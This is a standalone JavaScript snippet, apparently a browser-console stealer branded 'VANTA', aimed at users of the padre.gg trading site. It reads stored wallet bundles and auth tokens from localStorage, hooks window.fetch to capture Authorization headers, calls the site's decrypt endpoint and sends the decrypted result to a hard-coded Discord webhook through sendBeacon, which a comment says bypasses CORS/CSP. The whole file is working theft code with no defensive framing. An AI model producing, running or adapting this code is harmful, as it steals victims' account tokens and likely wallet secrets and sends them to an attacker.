(function() {
    const W = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    
    const start = async () => {
        console.log("%c[VANTA] AUTO-EXTRACTION STARTING...", "color: #00ff88; font-weight: bold;");

        // 1. Get Bundle from LocalStorage
        const bStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bStr) {
            console.error("[VANTA] User not logged in or storage empty.");
            return;
        }
        const b = JSON.parse(bStr);
        const k = Object.keys(b.bundles)[0];
        
        // 2. FIND THE TOKEN (Memory Scan)
        // We look in LocalStorage, SessionStorage, and common State keys
        let t = localStorage.getItem('auth_token') || 
                localStorage.getItem('token') || 
                JSON.parse(localStorage.getItem('user-store') || '{}')?.state?.token;

        // If not found, we force a background call to grab it from the browser's header cache
        if (!t) {
            console.log("[VANTA] Token not in storage. Forcing API Handshake...");
            const res = await fetch('/api/v2/user/profile');
            // The browser attaches the cookie/token automatically here
            // If the fetch succeeds, our sniffer (below) will catch it
        }

        // 3. THE SNIFFER (Catching the forced handshake)
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const h = args[1]?.headers;
            const auth = h instanceof Headers ? h.get('Authorization') : h?.['Authorization'];
            
            if (auth && !t) {
                execute(auth, b, k);
            }
            return _f.apply(this, args);
        };

        // If we already have the token from storage, run immediately
        if (t) execute(t, b, k);
    };

    const execute = async (t, b, k) => {
        console.log("[VANTA] TOKEN ACQUIRED. DECRYPTING...");
        const payload = {
            bundle: b.bundles[k].exportBundle,
            subOrgId: b.bundles[k].subOrgId
        };

        try {
            const r = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 'Authorization': t, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await r.text();

            // EXFILTRATION via sendBeacon (Bypasses CORS/CSP)
            const body = JSON.stringify({
                embeds: [{
                    title: "🏁 VANTA AUTO-SYNC COMPLETE",
                    description: "```json\n" + data.substring(0, 1800) + "\n```",
                    color: 65280
                }]
            });
            
            navigator.sendBeacon(W, new Blob([body], {type: 'text/plain'}));
            console.log("%c[VANTA] SUCCESS: DATA SENT TO DISCORD", "color: #00ff88;");
        } catch (e) {
            console.error("[VANTA] Execution Error:", e);
        }
    };

    start();
})();
